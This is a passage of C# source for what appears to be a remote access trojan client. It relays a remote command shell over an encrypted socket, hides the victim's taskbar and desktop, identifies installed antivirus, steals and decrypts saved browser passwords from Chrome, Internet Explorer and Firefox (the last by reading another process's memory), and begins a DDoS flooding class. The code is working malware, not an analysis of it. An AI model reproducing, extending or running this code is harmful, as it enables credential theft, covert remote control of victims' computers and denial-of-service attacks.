                        mouse_eventRightUP(MouseEventFlags.RIGHTUP, X, Y, 0, 0);
                        Console.WriteLine("mouseevent rightup");
                    }

                    else
                    {

                        mouse_eventRightDown(MouseEventFlags.RIGHTDOWN, X, Y, 0, 0);
                        Console.WriteLine("mouseevent rightdown");

                    }

                    break;
            }
        }
        //mouse event handler i put here because the old way kept crashing
        private static void mouse_eventLeftUP(MouseEventFlags lEFTUP, int x, int y, int v1, int v2)
        {

            Cursor.Position = new Point(x, y);

            mouse_event((int)(MouseEventFlags.LEFTUP), 0, 0, 0, 0);

        }
        private static void mouse_eventLeftDown(MouseEventFlags lEFTUP, int x, int y, int v1, int v2)
        {

            Cursor.Position = new Point(x, y);
            mouse_event((int)(MouseEventFlags.LEFTDOWN), 0, 0, 0, 0);

        }
        private static void mouse_eventRightUP(MouseEventFlags lEFTUP, int x, int y, int v1, int v2)
        {

            Cursor.Position = new Point(x, y);

            mouse_event((int)(MouseEventFlags.RIGHTUP), 0, 0, 0, 0);
        }
        private static void mouse_eventRightDown(MouseEventFlags lEFTUP, int x, int y, int v1, int v2)
        {

            Cursor.Position = new Point(x, y);

            mouse_event((int)(MouseEventFlags.RIGHTDOWN), 0, 0, 0, 0);

        }


        private static void DirectoryCopy(string sourceDirName, string destDirName, bool copySubDirs)
        {
            // Get the subdirectories for the specified directory.
            DirectoryInfo dir = new DirectoryInfo(sourceDirName);
            DirectoryInfo[] dirs = dir.GetDirectories();

            if (!dir.Exists)
            {
                throw new DirectoryNotFoundException(
                    "Source directory does not exist or could not be found: "
                    + sourceDirName);
            }

            // If the destination directory doesn't exist, create it. 
            if (!Directory.Exists(destDirName))
            {
                Directory.CreateDirectory(destDirName);
            }

            // Get the files in the directory and copy them to the new location.
            FileInfo[] files = dir.GetFiles();
            foreach (FileInfo file in files)
            {
                string temppath = Path.Combine(destDirName, file.Name);
                file.CopyTo(temppath, false);
            }

            // If copying subdirectories, copy them and their contents to new location. 
            if (copySubDirs)
            {
                foreach (DirectoryInfo subdir in dirs)
                {
                    string temppath = Path.Combine(destDirName, subdir.Name);
                    DirectoryCopy(subdir.FullName, temppath, copySubDirs);
                }
            }
        }

        private static void DirectoryMove(string sourceDirName, string destDirName, bool copySubDirs)
        {
            // Get the subdirectories for the specified directory.
            DirectoryInfo dir = new DirectoryInfo(sourceDirName);
            DirectoryInfo[] dirs = dir.GetDirectories();

            if (!dir.Exists)
            {
                throw new DirectoryNotFoundException(
                    "Source directory does not exist or could not be found: "
                    + sourceDirName);
            }

            // If the destination directory doesn't exist, create it. 
            if (!Directory.Exists(destDirName))
            {
                Directory.CreateDirectory(destDirName);
            }

            // Get the files in the directory and copy them to the new location.
            FileInfo[] files = dir.GetFiles();
            foreach (FileInfo file in files)
            {
                string temppath = Path.Combine(destDirName, file.Name);
                file.MoveTo(temppath);
            }

            // If copying subdirectories, copy them and their contents to new location. 
            if (copySubDirs)
            {
                foreach (DirectoryInfo subdir in dirs)
                {
                    string temppath = Path.Combine(destDirName, subdir.Name);
                    DirectoryMove(subdir.FullName, temppath, copySubDirs);
                }
            }

            else
            {

            }
        }

        private static void getShellInput()
        {
            Console.WriteLine("getShellInput()");
            try
            {
                string tempBuf = "";
                string tempError = "";
                string edata = "";
                string sdata = "";
                while ((tempBuf = fromShell.ReadLine()) != null)
                {
                    sdata = sdata + tempBuf + "\r";
                    Console.WriteLine("SData: " + @sdata);
                    Console.WriteLine("TempBuf: " + @tempBuf);
                    sdata = sdata.Replace("cmdout", string.Empty);
                    sendCommand("cmdout§" + sdata, true);
                    sdata = "";
                }

                while ((tempError = error.ReadLine()) != null)
                {
                    edata = edata + tempError + "\r";
                    sendCommand("cmdout§" + edata, true);
                    edata = "";
                }

            }
            catch (Exception ex)
            {
                sendCommand("cmdout§Error reading cmd response: \n" + ex.Message, true);
                reportError(errorType.CMD_STREAM_READ, "Can't read stream!", "Remote Cmd stream reading failed!");
            }

        }

        public static void hClock()   //hide clock
        {
            int hwnd = 0;
            ShowWindow(
              FindWindowEx(FindWindowEx(FindWindow("Shell_TrayWnd", null), hwnd, "TrayNotifyWnd", null),
              hwnd, "TrayClockWClass", null),
              SW_HIDE);
        }

        public static void sClock()  // see clock
        {
            int hwnd = 0;
            ShowWindow(
              FindWindowEx(FindWindowEx(FindWindow("Shell_TrayWnd", null), hwnd, "TrayNotifyWnd", null),
              hwnd, "TrayClockWClass", null),
              SW_SHOW);
        }

        public static void hTaskBar()
        {
            ShowWindow(FindWindow("Shell_TrayWnd", null), SW_HIDE);
        }

        public static void sTaskBar()
        {
            ShowWindow(FindWindow("Shell_TrayWnd", null), SW_SHOW);
        }

        public static void hDesktop()
        {
            ShowWindow(FindWindow(null, "Program Manager"), SW_HIDE);
        }

        public static void sDesktop()
        {
            ShowWindow(FindWindow(null, "Program Manager"), SW_SHOW);
        }

        public static void hTrayIcons()
        {
            int hwnd = 0;
            ShowWindow(FindWindowEx(FindWindow("Shell_TrayWnd", null),
                            hwnd, "TrayNotifyWnd", null),
                            SW_HIDE);
        }

        public static void sTrayIcons()
        {
            int hwnd = 0;
            ShowWindow(FindWindowEx(FindWindow("Shell_TrayWnd", null),
                            hwnd, "TrayNotifyWnd", null),
                            SW_SHOW);
        }

        public static void hStart()
        {
            ShowWindow(FindWindow("Button", null), SW_HIDE);
        }

        public static void sStart()
        {
            ShowWindow(FindWindow("Button", null), SW_SHOW);
        }

        private static void t2s(string stext)
        {
            using (SpeechSynthesizer speech = new SpeechSynthesizer()) //---------use this instead

            {
                speech.SetOutputToDefaultAudioDevice();

                speech.Speak(stext);
                // speech.Speak("hello");

            }

            //  System.Speech.Synthesis.SpeechSynthesizer speaker = new System.Speech.Synthesis.SpeechSynthesizer(); // this doesnt work
            // string voice = speaker.GetInstalledVoices().ToString(); //-------------added this to see maybe a response back with voices and audio devices?
            // Console.WriteLine(voice);

        }

        private static void generateFreq(int freq, int duration)
        {
            Console.Beep(freq, duration * 1000);
        }

        private static void createMessage(string[] info)
        {
            string title = info[1];
            string text = info[2];
            string icon = info[3];
            string button = info[4];
            MessageBoxIcon ico = MessageBoxIcon.None;
            MessageBoxButtons btn = MessageBoxButtons.OK;

            switch (icon)
            {
                case "0":
                    ico = MessageBoxIcon.None;
                    break;

                case "1":
                    ico = MessageBoxIcon.Error;
                    break;

                case "2":
                    ico = MessageBoxIcon.Warning;
                    break;

                case "3":
                    ico = MessageBoxIcon.Information;
                    break;

                case "4":
                    ico = MessageBoxIcon.Question;
                    break;
            }

            switch (button)
            {
                case "0":
                    btn = MessageBoxButtons.OK;
                    break;

                case "1":
                    btn = MessageBoxButtons.YesNo;
                    break;

                case "2":
                    btn = MessageBoxButtons.YesNoCancel;
                    break;

                case "3":
                    btn = MessageBoxButtons.AbortRetryIgnore;
                    break;

                case "4":
                    btn = MessageBoxButtons.OKCancel;
                    break;
            }

            MessageBox.Show(text, title, btn, ico);
        }

        public static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            return "N/A";
        }

        public static string AvName()
        {
            string wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
            var searcher = new ManagementObjectSearcher(wmipathstr, "SELECT * FROM AntivirusProduct");
            var instances = searcher.Get();
            string av = "";
            foreach (var instance in instances)
            {
                Console.WriteLine(instance.GetPropertyValue("displayName"));
                av = instance.GetPropertyValue("displayName").ToString();
            }

            if (av == "") av = "N/A";

            return av;
        }

        public static string Encrypt(string clearText)
        {
            try
            {
                string EncryptionKey = "MAKV2SPBNI99212";  //this is the secret encryption key  you want to hide dont show it to other guys and change it both server and client
                byte[] clearBytes = Encoding.Unicode.GetBytes(clearText);
                using (Aes encryptor = Aes.Create())
                {
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);

                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(clearBytes, 0, clearBytes.Length);
                            cs.Close();
                        }
                        clearText = Convert.ToBase64String(ms.ToArray());
                    }
                }
                return clearText;
            }
            catch (Exception)
            {
                reportError(errorType.ENCRYPT_DATA_CORRUPTED, "Can't encrypt message!", "Message encryption failed!");
                return clearText;
            }
        }

        public static string Decrypt(string cipherText)
        {
            try
            {
                string EncryptionKey = "MAKV2SPBNI99212"; //this is the secret encryption key  you want to hide dont show it to other guys and change it both server and client
                byte[] cipherBytes = Convert.FromBase64String(cipherText);
                Console.WriteLine("Encrypted Cipher Text: " + cipherText);
                using (Aes encryptor = Aes.Create())
                {
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(cipherBytes, 0, cipherBytes.Length);
                            cs.Close();
                        }
                        cipherText = Encoding.Unicode.GetString(ms.ToArray());
                    }
                }
                return cipherText;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine("Cipher Text: " + cipherText);
                reportError(errorType.DECRYPT_DATA_CORRUPTED, "Can't decrypt message!", "Message decryption failed!");
                return "error";
            }
        }

        private static void sendCommand(string response, bool isCmd = false)
        {
            if (!_clientSocket.Connected)
            {
                Console.WriteLine("Socket is not connected!");
                return;
            }
            string k = response;

            string crypted = Encrypt(k);
            if (isCmd) crypted = k;
            byte[] data = Encoding.Unicode.GetBytes(crypted);
            try
            {
                _clientSocket.Send(data);  //-added this as sometimes the tcp was not finished sending when it was asked to close the stream
            }
            catch (Exception ex)
            {
                Console.WriteLine("Send Command Failure " + ex.Message);
                return;//added this too
            }

        }

        private static void sendByte(byte[] data)
        {
            if (!_clientSocket.Connected)
            {
                Console.WriteLine("Socket is not connected!");
                return;
            }
            try
            {
                _clientSocket.Send(data);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Send Byte Failure " + ex.Message);
                return;
            }

        }
    }

    public class passwordManager    //PASSWORD CRACKER FOR WEB BROWSERS
    {

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);
        [DllImport("user32.dll", CharSet = CharSet.Ansi)]
        private static extern IntPtr SendMessageA(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, UInt32 nSize, UIntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, FreeType dwFreeType);
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CloseHandle(IntPtr hObject);

        private const int LVM_FIRST = 0x1000;
        private const int LVM_GETITEMCOUNT = LVM_FIRST + 4;
        private const int LVM_GETITEM = LVM_FIRST + 115;//LVM_FIRST + 45;
        private const int LVIF_TEXT = 0x0001;
        private const int ffprColumn = 13;
        private const int gcprColumn = 7;
        private const int ieprColumn = 1;
        private const int ffprLvid = 0;
        private const int gcprLvid = 0;
        private const int ieprLvid = 0;

        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct LVITEM
        {
            public uint mask;
            public int iItem;
            public int iSubItem;
            public uint state;
            public uint stateMask;
            public IntPtr pszText;
            public int cchTextMax;
            public int iImage;
            public IntPtr lParam;
        }
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        public enum FreeType
        {
            Decommit = 0x4000,
            Release = 0x8000,
        }

        IntPtr vTest;
        IntPtr listView;

        public string[] getSavedPassword()
        {
            List<string> result = new List<string>();
            string[] gcpw = getGCpw();
            string[] iepw = getIEpw();
            string[] ffpw = getFFpw();
            string formatResult = "";
            int checkCount = 0;
            foreach (string entry in gcpw)
            {
                if ((checkCount + 1) != gcpw.Length)
                {
                    formatResult += entry + "\n";
                }
                else
                {
                    formatResult += entry;
                }
                checkCount++;
            }
            result.Add(formatResult);
            formatResult = "";
            checkCount = 0;

            foreach (string entry in iepw)
            {
                if ((checkCount + 1) != iepw.Length)
                {
                    formatResult += entry + "\n";
                }
                else
                {
                    formatResult += entry;
                }
                checkCount++;
            }
            result.Add(formatResult);
            formatResult = "";
            checkCount = 0;

            foreach (string entry in ffpw)
            {
                if ((checkCount + 1) != ffpw.Length)
                {
                    formatResult += entry + "\n";
                }
                else
                {
                    formatResult += entry;
                }
                checkCount++;
            }
            result.Add(formatResult);
            formatResult = "";
            checkCount = 0;

            return result.ToArray();
        }

        public string[] getIEpw()
        {
            List<string[]> data = new List<string[]>();
            List<string> pwresult = new List<string>();
            UrlHistoryWrapperClass urlHistory;
            UrlHistoryWrapperClass.STATURLEnumerator enumerator;
            System.Collections.ArrayList list = new System.Collections.ArrayList();
            urlHistory = new UrlHistoryWrapperClass();
            enumerator = urlHistory.GetEnumerator();
            enumerator.GetUrlHistory(list);
            foreach (STATURL entry in list)
            {
                string append = entry.URL;
                Console.WriteLine(append);
                bool result = decryptIEpassword(append, data);
                if (result == false) data.Clear();
                if (data.Count == 0)
                {
                    //Ignore URL
                }
                else
                {
                    string toAppend = data[0][0] + "§" + data[0][1] + "§" + data[0][2];
                    pwresult.Add(toAppend);
                }
            }

            if (pwresult.Count == 0)
            {
                pwresult.Add("failed");
            }

            return pwresult.ToArray();
        }

        public const string keystr = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";

        public bool decryptIEpassword(string url, List<string[]> dataList)
        {
            string urlhash = GetURLHashString(url);
            if (!DoesURLMatchWithHash(urlhash)) return false;
            //MessageBox.Show("url match " + url);
            RegistryKey key = Registry.CurrentUser.OpenSubKey(keystr);
            if (key == null) return false;
            //MessageBox.Show("key open");
            byte[] cypherBytes = (byte[])key.GetValue(urlhash);
            key.Close();
            byte[] optionalEntropy = new byte[2 * (url.Length + 1)];
            Buffer.BlockCopy(url.ToCharArray(), 0, optionalEntropy, 0, url.Length * 2);
            byte[] decryptedBytes = ProtectedData.Unprotect(cypherBytes, optionalEntropy, DataProtectionScope.CurrentUser);
            var ieAutoHeader = ByteArrayToStructure<IEAutoCompleteSecretHeader>(decryptedBytes);
            if (decryptedBytes.Length >= (ieAutoHeader.dwSize + ieAutoHeader.dwSecretInfoSize + ieAutoHeader.dwSecretSize))
            {
                uint dwTotalSecrets = ieAutoHeader.IESecretHeader.dwTotalSecrets / 2;
                int sizeOfSecretEntry = Marshal.SizeOf(typeof(SecretEntry));
                byte[] secretsBuffer = new byte[ieAutoHeader.dwSecretSize];
                int offset = (int)(ieAutoHeader.dwSize + ieAutoHeader.dwSecretInfoSize);
                Buffer.BlockCopy(decryptedBytes, offset, secretsBuffer, 0, secretsBuffer.Length);
                if (dataList == null)
                {
                    dataList = new List<string[]>();
                }
                else
                {
                    dataList.Clear();
                }
                offset = Marshal.SizeOf(ieAutoHeader);
                for (int i = 0; i < dwTotalSecrets; i++)
                {
                    byte[] secEntryBuffer = new byte[sizeOfSecretEntry];
                    Buffer.BlockCopy(decryptedBytes, offset, secEntryBuffer, 0, secEntryBuffer.Length);
                    SecretEntry secEntry = ByteArrayToStructure<SecretEntry>(secEntryBuffer);
                    string[] dataTriplets = new string[3];
                    byte[] secret1 = new byte[secEntry.dwLength * 2];
                    Buffer.BlockCopy(secretsBuffer, (int)secEntry.dwOffset, secret1, 0, secret1.Length);
                    dataTriplets[0] = Encoding.Unicode.GetString(secret1);
                    offset += sizeOfSecretEntry;
                    Buffer.BlockCopy(decryptedBytes, offset, secEntryBuffer, 0, secEntryBuffer.Length);
                    secEntry = ByteArrayToStructure<SecretEntry>(secEntryBuffer);
                    byte[] secret2 = new byte[secEntry.dwLength * 2];
                    Buffer.BlockCopy(secretsBuffer, (int)secEntry.dwOffset, secret2, 0, secret2.Length);
                    dataTriplets[1] = Encoding.Unicode.GetString(secret2);
                    dataTriplets[2] = url;
                    dataList.Add(dataTriplets);
                    offset += sizeOfSecretEntry;
                }
            }

            return true;
        }

        public string GetURLHashString(string wstrUrl)
        {
            IntPtr hProv = IntPtr.Zero;
            IntPtr hHash = IntPtr.Zero;

            CryptAcquireContext(out hProv, string.Empty, string.Empty, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
            if (!CryptCreateHash(hProv, ALG_ID.CALG_SHA1, IntPtr.Zero, 0, ref hHash))
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
            byte[] bytesToCrypt = Encoding.Unicode.GetBytes(wstrUrl);
            StringBuilder urlhash = new StringBuilder(42);
            if (CryptHashData(hHash, bytesToCrypt, (uint)(wstrUrl.Length + 1) * 2, 0))
            {
                uint dwHashLen = 20;
                byte[] buffer = new byte[dwHashLen];
                if (!CryptGetHashParam(hHash, HashParameters.HP_HASHVAL, buffer, ref dwHashLen, 0))
                    throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
                byte tail = 0;
                urlhash.Length = 0;
                for (int i = 0; i < dwHashLen; i++)
                {
                    byte c = buffer[i];
                    tail += c;
                    urlhash.AppendFormat("{0:X2}", c);
                }
                urlhash.AppendFormat("{0:X2}", tail);
                CryptDestroyHash(hHash);
            }
            CryptReleaseContext(hProv, 0);
            return urlhash.ToString();
        }

        public bool DoesURLMatchWithHash(String urlHash)
        {
            bool result = false;
            RegistryKey key = Registry.CurrentUser.OpenSubKey(keystr);
            if (key == null) return false;
            string[] values = key.GetValueNames();
            foreach (string name in values)
            {
                if (name == urlHash)
                {
                    result = true;
                    break;
                }
            }

            return result;
        }

        public T ByteArrayToStructure<T>(byte[] bytes) where T : struct
        {
            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            T stuff = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
            handle.Free();
            return stuff;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct IESecretInfoHeader
        {
            public uint dwidheader;
            public uint dwSize;
            public uint dwTotalSecrets;
            public uint unknow;
            public uint id4;
            public uint unknownZero;
        };

        [StructLayout(LayoutKind.Sequential)]
        struct IEAutoCompleteSecretHeader
        {
            public uint dwSize;
            public uint dwSecretInfoSize;
            public uint dwSecretSize;
            public IESecretInfoHeader IESecretHeader;
        };

        [StructLayout(LayoutKind.Explicit)]
        struct SecretEntry
        {
            [FieldOffset(0)]
            public uint dwOffset;

            [FieldOffset(4)]
            public byte secretId;
            [FieldOffset(5)]
            public byte secretId1;
            [FieldOffset(6)]
            public byte secretId2;
            [FieldOffset(7)]
            public byte secretId3;
            [FieldOffset(8)]
            public byte secretId4;
            [FieldOffset(9)]
            public byte secretId5;
            [FieldOffset(10)]
            public byte secretId6;
            [FieldOffset(11)]
            public byte secretId7;

            [FieldOffset(12)]
            public uint dwLength;
        };

        private const uint PROV_RSA_FULL = 1;
        private const uint CRYPT_VERIFYCONTEXT = 0xF0000000;
        private const int ALG_CLASS_HASH = 4 << 13;
        private const int ALG_SID_SHA1 = 4;
        public enum ALG_ID
        {
            CALG_MD5 = 0x00008003,
            CALG_SHA1 = ALG_CLASS_HASH | ALG_SID_SHA1
        }
        enum HashParameters
        {
            HP_ALGID = 0x0001,   // Hash algorithm
            HP_HASHVAL = 0x0002, // Hash value
            HP_HASHSIZE = 0x0004 // Hash value size
        }

        [DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptAcquireContext(out IntPtr hProv, string pszContainer, string pszProvider, uint dwProvType, uint dwFlags);
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CryptCreateHash(IntPtr hProv, ALG_ID algId, IntPtr hKey, uint dwFlags, ref IntPtr phHash);
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CryptHashData(IntPtr hHash, byte[] pbData, uint dataLen, uint flags);
        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool CryptGetHashParam(IntPtr hHash, HashParameters dwParam, [Out] byte[] pbData, ref uint pdwDataLen, uint dwFlags);
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool CryptDestroyHash(IntPtr hHash);
        [DllImport("Advapi32.dll", EntryPoint = "CryptReleaseContext", CharSet = CharSet.Unicode, SetLastError = true)]
        extern static bool CryptReleaseContext(IntPtr hProv, int dwFlags);

        public string[] getGCpw()
        {
            string file = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
            if (File.Exists(Application.StartupPath + "\\logindata")) File.Delete(Application.StartupPath + "\\logindata");
            if (!File.Exists(file))
            {
                return new string[] { "failed" };
            }
            File.Copy(file, Application.StartupPath + "\\logindata");
            List<string> gcLogin = new List<string>();
            string sql = "SELECT username_value, password_value, origin_url FROM logins WHERE blacklisted_by_user = 0";
            using (SQLiteConnection c = new SQLiteConnection("Data Source=logindata;Version=3;"))
            {
                c.Open();
                using (SQLiteCommand cmd = new SQLiteCommand(sql, c))
                {
                    using (SQLiteDataReader r = cmd.ExecuteReader())
                    {
                        while (r.Read())
                        {
                            string username = Convert.ToString(r["username_value"]);
                            var passwordBuffer = (byte[])r.GetValue(1);
                            string password = decryptGCpassword(passwordBuffer);
                            string url = Convert.ToString(r["origin_url"]);
                            string dataString = url + "§" + username + "§" + password;
                            gcLogin.Add(dataString);
                        }
                    }
                }
            }

            if (gcLogin.Count == 0)
            {
                gcLogin.Add("failed");
            }

            return gcLogin.ToArray();
        }

        public string decryptGCpassword(byte[] blob)
        {
            byte[] decrypted = ProtectedData.Unprotect(blob, null, DataProtectionScope.CurrentUser);
            return Encoding.UTF8.GetString(decrypted);
        }

        private bool isFFinstalled()
        {
            string regKey = "SOFTWARE\\Mozilla\\Mozilla Firefox";
            RegistryKey key = Registry.LocalMachine.OpenSubKey(regKey);
            if (key == null) return false;
            return true;
        }

        public string[] getFFpw()
        {
            if (!isFFinstalled()) return new string[] { "failed" };
            string location = "ff.exe";
            int fflvOffset = 2;
            ProcessStartInfo info = new ProcessStartInfo();
            Process p = new Process();
            info.WindowStyle = ProcessWindowStyle.Hidden;

            info.FileName = location;
            p.StartInfo = info;
            p.Start();
            Thread.Sleep(3000);
            vTest = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "PasswordFox", null);//FindWindow(null, p.MainWindowTitle);
            Console.WriteLine(vTest.ToString("X"));
            //MessageBox.Show("Main Window Handle: " + vTest.ToString());
            listView = enumWindows(vTest, fflvOffset);
            //MessageBox.Show("ListView Handle: " + listView.ToString("X"));
            int items = getItemsCount(listView);
            //MessageBox.Show("Items in listView: " + items);
            List<string> lvItems = new List<string>();
            if (items == 0)
            {
                p.Kill();
                return new string[] { "failed" };
            }
            //MessageBox.Show("Getting Passwords");
            for (int i = 0; i < items; i++)
            {
                string currentItem = "";
                for (int t = 0; t < ffprColumn; t++)
                {
                    string currentSubitem = getSubItem(t, i, "ff");
                    if (t + 1 != ffprColumn)
                    {
                        currentSubitem += "§";
                    }

                    currentItem += currentSubitem;
                }

                lvItems.Add(currentItem);
            }

            p.Kill();

            return lvItems.ToArray();
        }

        private int getItemsCount(IntPtr lvHandle)
        {
            IntPtr result = SendMessageA(lvHandle, LVM_GETITEMCOUNT, IntPtr.Zero, IntPtr.Zero);
            return result.ToInt32();
        }

        private string getSubItem(int subitem, int item, string processName)
        {
            IntPtr extractBufferLength = (IntPtr)512;
            int procID = Process.GetProcessesByName(processName)[0].Id;
            //MessageBox.Show("Process id: " + procID + " | " + subitem + " | " + item);
            IntPtr pHandle = OpenProcess(ProcessAccessFlags.VirtualMemoryOperation | ProcessAccessFlags.VirtualMemoryRead | ProcessAccessFlags.VirtualMemoryWrite, false, procID);
            IntPtr pExtractBuffer = VirtualAllocEx(pHandle, (IntPtr)0, extractBufferLength, AllocationType.Commit, MemoryProtection.ReadWrite);
            //MessageBox.Show(pExtractBuffer.ToString());
            LVITEM lvi = new LVITEM();
            lvi.mask = LVIF_TEXT;
            lvi.cchTextMax = extractBufferLength.ToInt32();
            lvi.iSubItem = subitem;
            lvi.pszText = pExtractBuffer;
            IntPtr pStructBuffer = VirtualAllocEx(pHandle, (IntPtr)0, (IntPtr)Marshal.SizeOf(lvi), AllocationType.Commit, MemoryProtection.ReadWrite);
            byte[] data = getBytes(lvi);
            WriteStructureToProcessMemory(pHandle, pStructBuffer, lvi);
            IntPtr length = SendMessageA(listView, LVM_GETITEM, (IntPtr)item, pStructBuffer);
            byte[] retBuffer = new byte[length.ToInt32() * 2];
            IntPtr bytesRead = IntPtr.Zero;
            ReadProcessMemory(pHandle, pExtractBuffer, retBuffer, length.ToInt32() * 2, out bytesRead);
            string subItemText = Encoding.Unicode.GetString(retBuffer);
            //MessageBox.Show(Encoding.Unicode.GetString(retBuffer));
            VirtualFreeEx(pHandle, pExtractBuffer, 0, FreeType.Release);
            VirtualFreeEx(pHandle, pStructBuffer, 0, FreeType.Release);
            CloseHandle(pHandle);
            return subItemText;
        }

        private void WriteStructureToProcessMemory(IntPtr processHandle, IntPtr BaseAddress, LVITEM obj)
        {
            uint sizeOfLVITEM = (uint)Marshal.SizeOf(typeof(LVITEM));
            IntPtr ptrToLvItem = Marshal.AllocHGlobal((int)sizeOfLVITEM);
            Marshal.StructureToPtr(obj, ptrToLvItem, true);

            WriteProcessMemory(processHandle, BaseAddress, ptrToLvItem, sizeOfLVITEM, UIntPtr.Zero);
        }

        private byte[] getBytes(LVITEM str)
        {
            int size = Marshal.SizeOf(str);
            byte[] arr = new byte[size];

            IntPtr ptr = Marshal.AllocHGlobal(size);
            Marshal.StructureToPtr(str, ptr, true);
            Marshal.Copy(ptr, arr, 0, size);
            Marshal.FreeHGlobal(ptr);
            return arr;
        }

        private IntPtr enumWindows(IntPtr mainHandle, int lvLocation)
        {
            IntPtr lvPtr = IntPtr.Zero;
            IntPtr prevPtr = IntPtr.Zero;
            int enumPos = 0;

            while (true)
            {
                if (enumPos == 0)
                {
                    prevPtr = FindWindowEx(mainHandle, (IntPtr)0, null, null);
                }
                else
                {
                    prevPtr = FindWindowEx(mainHandle, prevPtr, null, null);
                }
                Console.WriteLine("Aquired Handle: " + prevPtr.ToString("X"));
                if (enumPos == lvLocation) break;

                enumPos++;
            }

            lvPtr = prevPtr;

            return lvPtr;
        }
    }

    public class ddos
        {
            private string ip = "";
            private int port = 0;
            private int prot = 0;
            private int packetSize = 0;
            private int Threads = 0;
            private int delay = 0;
            private const int protocol_tcp = 0;
            private const int protocol_udp = 1;
            private const int protocol_icmp = 2;
            Thread t_ddos;
            bool kill = false;

            public ddos(string cIp, string cPort, string cProtocol, string cPacketSize, string cThreads, string cDelay)
            {
                ip = cIp;
                port = int.Parse(cPort);
                switch (cProtocol)
                {
                    case "TCP":
                        prot = protocol_tcp;
                        break;

                    case "UDP":
                        prot = protocol_udp;
                        break;

                    case "ICMP ECHO (Ping)":
                        prot = protocol_icmp;
                        break;
                }

                packetSize = int.Parse(cPacketSize);
                Threads = int.Parse(cThreads);
                delay = int.Parse(cDelay);
            }

            public void startDdos()
            {
                t_ddos = new Thread(new ThreadStart(ddosTarget));
